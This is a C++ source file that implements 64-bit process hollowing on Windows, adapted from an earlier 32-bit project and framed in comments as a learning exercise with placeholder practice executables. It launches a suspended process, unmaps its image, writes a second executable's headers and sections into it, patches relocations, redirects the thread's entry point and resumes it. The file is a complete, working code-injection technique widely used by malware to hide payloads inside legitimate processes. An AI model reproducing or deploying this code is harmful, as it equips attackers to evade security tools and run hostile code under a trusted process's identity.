// source.cpp : This file contains the 'main' function. Program execution begins and ends there.
// Thanks to https://github.com/m0n0ph1/Process-Hollowing  for the initial code, it only worked on 32 bit architectures, i made it 64 bit compatible
// both process , source and destination should be 64 bit

// we need to link ntdll.dll dynamically to use function NtQueryInformationProcess()
// things to learn 
// 1. loading a process in memory
// 2. starting a process in suspended mode and unmapping it
// 3. loading the source process
// 4. iterating through its headers and sections - copying them in suspended process
// 5. patch the binary with relocations
// 6. Changing AddressOfEntryPoint
// 7. resuming the suspended process

#include <iostream>
#include<Windows.h>
#include<winternl.h>


typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG Returnlength);

pfnNtQueryInformationProcess gNtQueryInformationProcess;


using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);


typedef struct BASE_RELOCATION_BLOCK
{
    DWORD pageAddress;
    DWORD Blocksize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;


typedef struct BASE_RELOCATION_ENTRY
{
    USHORT offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


typedef struct _PROCESS_BASIC_INFORMATION64
{
    NTSTATUS ExitStatus;
    UINT32 Reserved0;
    UINT64 PebBaseAddress;
    UINT64 AffinityMask;
    UINT32 BasePriority;
    UINT32 Reserved1;
    UINT64 UniqueProcessId;
    UINT64 InheritdFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION64;





//process to be hollowed - destination process
wchar_t pName[] = { L"1-64bit-practiceApp.exe" };

//process which will be executed inplace of hollowed process - source process
wchar_t sName[] = { L"2-64bit-practiceApp.exe" };



int main()
{
    //create destination process - this is the process to be hollowed out
    LPSTARTUPINFO si = new STARTUPINFO();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();    // 32-64
    DWORD returnLength = 0;
   

    PROCESS_BASIC_INFORMATION64* pbi64 = new PROCESS_BASIC_INFORMATION64;


    if (!CreateProcessW(pName, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi))
    {
        MessageBox(NULL, L"failed to create process", L"error", MB_OK | MB_TOPMOST);
        return 0;
    }
    HANDLE destProcess = pi->hProcess;


    //dynamic linking of ntdll.dll
    /*HMODULE hNtDll = LoadLibrary(L"C:\\Users\\bhara\\Desktop\\ntdll.dll");
    if (hNtDll == NULL)
    {
        MessageBox(NULL, L"failed to load ntdll.dll", L"error", MB_OK | MB_TOPMOST);
        return 0;
    }*/

    HMODULE NtdllModule = GetModuleHandle(L"ntdll.dll");
    if (NtdllModule == NULL)
    {
        MessageBox(NULL, L"failed to load ntdll.dll", L"error", MB_OK | MB_TOPMOST);
        return 0;
    }
    gNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(NtdllModule, "NtQueryInformationProcess");

    if (gNtQueryInformationProcess == NULL)
    {
        MessageBox(NULL, L"failed to get procaddress for NtQueryInformationProcess", L"error", MB_OK | MB_TOPMOST);
        return 0;
    }


    //get destination imagebase offset address from the PEB
    NTSTATUS dwStatus = gNtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi64, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);         //32-64
    uintptr_t pebImageBaseOffset = (uintptr_t)pbi64->PebBaseAddress + 16;                                                                                  //32-64

    //get destination imagebaseaddress
    LPVOID destImageBase = 0;
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 8, &bytesRead);        //32-64                                               


    //read sourcefile - this is the file that will be executed inside the hollowed process
    HANDLE sourceFile = CreateFile(sName, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    if (sourceFile == INVALID_HANDLE_VALUE)
    {
        MessageBox(NULL, L"failed to CreateFile", L"error", MB_OK | MB_TOPMOST);
        return 0;
    }
    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
    LPDWORD fileBytesRead = 0;
    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
    ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);

    //get source image size
    PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
    PIMAGE_NT_HEADERS sourceImageNtHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
    SIZE_T sourceImageSize = sourceImageNtHeaders->OptionalHeader.SizeOfImage;

    // carve out the destination image
    NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandle(L"ntdll"), "NtUnmapViewOfSection"));
    if (myNtUnmapViewOfSection == NULL)
    {
        MessageBox(NULL, L"failed to get procaddress for NtUnmapViewOfSection", L"error", MB_OK | MB_TOPMOST);
        return 0;
    }
    myNtUnmapViewOfSection(destProcess, destImageBase);

    //allocate new memory in destination image for the source image
    LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    destImageBase = newDestImageBase;

    //get delta between sourceimagebaseaddress and destinationimagebaseaddress
    uintptr_t deltaImageBase = (uintptr_t)destImageBase - sourceImageNtHeaders->OptionalHeader.ImageBase;

    //set sourceImageBase to destImageBase and copy the source Image headers to the destination Image
    sourceImageNtHeaders->OptionalHeader.ImageBase = (uintptr_t)destImageBase;
    WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNtHeaders->OptionalHeader.SizeOfHeaders, NULL);


    //get pointer to first source image section 
    PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((uintptr_t)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS64));    //  32-64
    PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
    int err = GetLastError();

    //copy source image sections to destination
    for (int i = 0; i < sourceImageNtHeaders->FileHeader.NumberOfSections; i++)
    {
        PVOID destinationSectionLocation = (PVOID)((uintptr_t)destImageBase + sourceImageSection->VirtualAddress);
        PVOID sourceSectionLocation = (PVOID)((uintptr_t)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
        WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
        sourceImageSection++;
    }


    //get address of relocation table
    IMAGE_DATA_DIRECTORY relocationTable = sourceImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];


    //patch the binary with relocations
    sourceImageSection = sourceImageSectionOld;
    for (int i = 0; i < sourceImageNtHeaders->FileHeader.NumberOfSections; i++)
    {
        BYTE* relocSectionName = (BYTE*)".reloc";
        if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
        {
            sourceImageSection++;
            continue;
        }

        uintptr_t sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
        uintptr_t relocationOffset = 0;

        while (relocationOffset < relocationTable.Size)
        {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((uintptr_t)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationEntryCount = (relocationBlock->Blocksize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((uintptr_t)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

            for (DWORD y = 0; y < relocationEntryCount; y++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (relocationEntries[y].Type == 0)
                {
                    continue;
                }
                uintptr_t patchAddress = relocationBlock->pageAddress + relocationEntries[y].offset;
                uintptr_t patchedBuffer = 0;
                ReadProcessMemory(destProcess, (LPCVOID)((uintptr_t)destImageBase + patchAddress), &patchedBuffer, sizeof(uintptr_t), &bytesRead);                             //32-64
                patchedBuffer += deltaImageBase;

                WriteProcessMemory(destProcess, (PVOID)((uintptr_t)destImageBase + patchAddress), &patchedBuffer, sizeof(uintptr_t), (SIZE_T*)fileBytesRead);                  //32-64
                int a = GetLastError();
            }
        }
    }

    //get context of the dest process thread
    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi->hThread, context);

    //update dest image entry point to the new entry point of the source image and resume dest image thread
    uintptr_t patchedEntryPoint = (uintptr_t)destImageBase + sourceImageNtHeaders->OptionalHeader.AddressOfEntryPoint;
    context->Rdx = patchedEntryPoint;
    SetThreadContext(pi->hThread, context);
    ResumeThread(pi->hThread);

    //system("pause");

    return 0;
}
